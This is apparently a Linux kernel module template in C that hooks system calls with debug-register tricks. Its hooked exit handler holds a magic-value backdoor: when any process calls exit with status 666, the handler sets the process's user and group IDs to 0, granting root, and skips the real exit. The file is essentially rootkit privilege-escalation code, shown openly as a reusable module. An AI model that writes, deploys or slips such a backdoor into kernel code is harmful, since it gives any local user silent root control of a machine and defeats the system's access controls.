#include "DR.h"
#include "hooktable.h"

/*
 * Dummy module implementing system call hooking using DR logic.
 *
 * edit Makefile and set your module main accordingly
 */
asmlinkage static void my_hooked_exit(int status)
{
    __HOOK_PRELOGUE;
    int (*orig_exit)(int st) = __SYSCALL_HANDLER_ADDR(__NR_exit);

    printk(KERN_INFO "**** my_hooked_exit called *****\n");

    if(status == 666) {
      printk(KERN_INFO "**** MAGICK *****\n");

      current->uid = 0;
      current->euid = 0;
      current->gid = 0;
      current->egid = 0;

      return -EINVAL;
    }

    orig_exit(status);
}

int __init init_syscall_hook(void)
{
    init_hook_table();

    register_hook(__NR_exit, (void*) my_hooked_exit);

    init_DR();

    printk(KERN_INFO "**** DR based syscall hook loaded ****\n");

    return 0;
}

void __exit exit_syscall_hook(void)
{
    uninit_hook_table();
    exit_DR();

    return;
}

module_init(init_syscall_hook);
module_exit(exit_syscall_hook);
MODULE_LICENSE("GPL");


